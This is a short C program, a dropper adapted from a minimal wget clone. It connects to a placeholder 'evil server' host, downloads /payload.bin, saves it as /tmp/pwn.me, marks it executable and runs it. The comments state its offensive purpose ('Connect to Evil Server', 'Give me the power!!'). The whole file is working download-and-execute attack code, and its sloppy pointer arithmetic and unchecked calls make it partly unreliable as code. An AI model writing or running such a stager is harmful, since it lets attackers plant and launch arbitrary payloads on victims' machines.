// Based on wget_sortof.c (Vyacheslav Goltser <slavikg@gmail.com>)
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// You have to use your own HOSTNAME, PORT and REQUEST
#define HOSTNAME "exploit.fooserver.com"
#define PORT 80
#define REQUEST "GET /payload.bin HTTP/1.0\n\n"
#define PAYLOAD "/tmp/pwn.me"

#define MAXARRAY 150000

int main(int argc, char **argv)
{
    // Connect to Evil Server
    struct sockaddr_in servaddr;
    struct hostent *hp;
    int sock_id;
    char message[MAXARRAY];
    int msglen;
    char request[] = REQUEST;
    sock_id = socket(AF_INET, SOCK_STREAM, 0);
    memset(&servaddr,0,sizeof(servaddr));
    hp = gethostbyname(HOSTNAME);
    memcpy((char *)&servaddr.sin_addr.s_addr, (char *)hp->h_addr, hp->h_length);
    servaddr.sin_port = htons(PORT);
    servaddr.sin_family = AF_INET;
    connect(sock_id, (struct sockaddr *)&servaddr, sizeof(servaddr));
    
    // Send Request & Receive Response
    write(sock_id,request,strlen(request));
    msglen = read(sock_id,message,MAXARRAY);

    // Open File Handler
    FILE * pFile;
    pFile = fopen( PAYLOAD, "wb" );

    // Ignore HTTP Headers
    char * content;
    int cntlen;
    content = strstr(message,"\r\n\r\n");
    content = &(content[4]);
    cntlen = msglen + (int)(message) - (int)(content);

    // Write First Packets
    fwrite (content , 1 , cntlen , pFile );
    // Write All Other Packets
    msglen = read(sock_id,message,MAXARRAY);
    while ( msglen != 0 )
    {
	fwrite (message, 1 , msglen , pFile );
        msglen = read(sock_id,message,MAXARRAY);
    }

    // Close Handlers
    close( sock_id );
    fclose( pFile );

    // Execute File
    chmod( PAYLOAD, strtol("0755",0,8) );
    syscall(0); // Give me the power!!
    execvp( PAYLOAD, NULL);

    return 0;
}
